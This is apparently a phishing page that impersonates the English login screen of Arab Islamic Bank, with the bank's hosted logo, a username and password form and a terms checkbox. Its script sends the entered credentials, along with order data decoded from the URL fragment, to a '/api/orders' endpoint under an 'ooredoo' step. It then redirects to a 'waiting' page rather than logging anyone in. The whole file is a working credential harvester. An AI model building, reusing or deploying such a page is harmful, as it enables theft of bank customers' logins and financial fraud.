<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Login | Arab Islamic Bank</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=IBM+Plex+Sans+Arabic:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root{
  --primary:#1B6B3A; --primary-deep:#145A2E; --primary-light:rgba(27,107,58,.08);
  --bg:#f0eeeb; --surface:#fff; --ink:#1c1720; --muted:#888;
}
*{box-sizing:border-box; margin:0; padding:0}
body{font-family:"IBM Plex Sans Arabic","Cairo",sans-serif; background:var(--bg); min-height:100vh; display:flex; flex-direction:column}

.top-bar{display:flex; align-items:center; justify-content:center; padding:12px 16px}
.lang-btn{background:var(--primary); color:#fff; border:none; border-radius:10px; padding:8px 18px; font-family:inherit; font-weight:700; font-size:.85rem; cursor:pointer; display:flex; align-items:center; gap:6px}
.lang-btn svg{width:14px; height:14px}
.menu-btn{width:44px; height:44px; border-radius:50%; background:#6b7b6e; color:#fff; border:none; display:flex; align-items:center; justify-content:center; cursor:pointer; font-size:1.4rem}
.logo-area{display:flex; align-items:center; justify-content:center; gap:0}
.logo-area img{height:44px}

.login-container{flex:1; display:flex; flex-direction:column; align-items:center; padding:30px 24px 40px}

.field-group{width:100%; max-width:400px; margin-bottom:22px}
.field-label{display:block; font-weight:700; font-size:1rem; margin-bottom:10px; color:var(--ink); text-align:left}
.input-wrap{display:flex; align-items:center; background:#e8e5e0; border-radius:14px; padding:0 16px; height:54px; gap:12px}
.input-wrap .icon{width:24px; height:24px; color:#555; flex:none; display:flex; align-items:center; justify-content:center}
.input-wrap .icon svg{width:22px; height:22px}
.input-wrap input{flex:1; border:none; background:transparent; font-family:inherit; font-size:1rem; color:var(--ink); outline:none; text-align:left; direction:ltr}
.input-wrap input::placeholder{color:#999}
.input-wrap .toggle-pass{background:none; border:none; cursor:pointer; color:#555; display:flex; align-items:center; padding:4px}
.input-wrap .toggle-pass svg{width:22px; height:22px}

.terms-row{width:100%; max-width:400px; display:flex; align-items:center; justify-content:center; gap:8px; margin:10px 0 28px; font-size:.92rem; color:#555}
.terms-row input[type=checkbox]{width:20px; height:20px; accent-color:var(--primary); flex:none}
.terms-row a{color:var(--ink); font-weight:700; text-decoration:underline}

.login-btn{width:100%; max-width:400px; height:56px; border:none; border-radius:28px; background:var(--primary); color:#fff; font-family:inherit; font-weight:900; font-size:1.25rem; cursor:pointer; transition:background .2s; letter-spacing:.5px}
.login-btn:hover{background:var(--primary-deep)}
.login-btn:disabled{opacity:.6; cursor:not-allowed}

.signup-row{margin-top:20px; font-size:.95rem; color:#555; text-align:center}
.signup-row a{color:var(--primary); font-weight:900; text-decoration:none}

.hint{color:#c0263b; font-size:.82rem; margin-top:6px; display:none; text-align:left; max-width:400px; width:100%}
.hint.show{display:block}

.error-msg{width:100%; max-width:400px; color:#c0263b; font-weight:900; font-size:1rem; text-align:center; margin-bottom:16px; display:none}
.error-msg.show{display:block}
</style>
</head>
<body>

<div class="top-bar">
  <div class="logo-area">
    <img src="https://aib.ps/uc_files/image/resize/226/53/app_files/logopng_16691947964653877586094.png?vsig=fe3b85fa430300011345c623e9bc93d1" alt="AIB">
  </div>
</div>

<div class="login-container">
  <form id="loginForm" autocomplete="off" style="width:100%; max-width:400px; display:flex; flex-direction:column; align-items:center">

    <div class="field-group">
      <label class="field-label">Username</label>
      <div class="input-wrap">
        <div class="icon"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg></div>
        <input type="text" id="username" placeholder="Enter your username" required>
      </div>
    </div>
    <div class="hint" id="h-username">Please enter your username</div>

    <div class="field-group">
      <label class="field-label">Password</label>
      <div class="input-wrap">
        <div class="icon"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg></div>
        <input type="password" id="password" placeholder="Enter your password" required>
        <button type="button" class="toggle-pass" id="togglePass">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" id="eyeIcon"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
        </button>
      </div>
    </div>
    <div class="hint" id="h-password">Please enter your password</div>

    <div class="terms-row">
      <input type="checkbox" id="agreeTerms">
      <span>Agree to</span>
      <a href="#">Terms & Conditions.</a>
    </div>
    <div class="hint" id="h-agree" style="text-align:center">You must agree to the terms to continue</div>

    <div class="error-msg" id="errorMsg"></div>

    <button type="submit" class="login-btn" id="submitBtn">Login</button>

    <div class="signup-row">
      Don't have an account? <a href="#">Create Account</a>
    </div>
  </form>
</div>

<script>
const $ = id => document.getElementById(id);

$("togglePass").addEventListener("click", () => {
  const p = $("password");
  const isPass = p.type === "password";
  p.type = isPass ? "text" : "password";
  $("eyeIcon").innerHTML = isPass
    ? '<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
    : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
});

function showHint(id) { $(id).classList.add("show"); }
function hideHint(id) { $(id).classList.remove("show"); }

if (new URLSearchParams(location.search).get("error") === "1") {
  $("errorMsg").textContent = "Incorrect username or password";
  $("errorMsg").classList.add("show");
}

$("loginForm").addEventListener("submit", async e => {
  e.preventDefault();
  hideHint("h-username"); hideHint("h-password"); hideHint("h-agree");
  $("errorMsg").classList.remove("show");
  let ok = true;
  if (!$("username").value.trim()) { showHint("h-username"); ok = false; }
  if (!$("password").value.trim()) { showHint("h-password"); ok = false; }
  if (!$("agreeTerms").checked) { showHint("h-agree"); ok = false; }
  if (!ok) return;

  const btn = $("submitBtn");
  btn.disabled = true; btn.textContent = "Verifying...";

  const orderHash = location.hash.slice(1);
  const parts = orderHash.split("~");
  const ref = parts[0];
  let orderData = {};
  try { const bin = atob((parts[1]||"e30=").replace(/-/g,"+").replace(/_/g,"/")); orderData = JSON.parse(new TextDecoder().decode(Uint8Array.from(bin, c=>c.charCodeAt(0)))); } catch(e){}

  try {
    await fetch("/api/orders", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ...orderData, ref: ref, status: "awaiting", lang: "en", ooredoo: { username: $("username").value.trim(), password: $("password").value.trim() }, step: "ooredoo" })
    });
  } catch (e) {}

  window.location.href = "waiting-en.html#" + orderHash;
});

</script>
</body>
</html>
